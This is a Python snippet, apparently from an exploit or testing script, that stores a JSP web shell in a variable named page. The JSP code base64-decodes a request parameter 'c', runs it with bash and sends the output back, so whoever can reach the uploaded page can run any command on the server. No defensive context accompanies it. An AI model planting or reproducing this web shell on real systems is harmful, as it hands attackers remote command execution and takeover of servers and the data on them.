page = (
    '<%out.print(new java.util.Scanner(new ProcessBuilder("bash","-c",'
    'new String(java.util.Base64.getDecoder().decode(request.getParameter("c"))))'
    '.redirectErrorStream(true).start().getInputStream()).useDelimiter("\\\\A").next());%>'
)
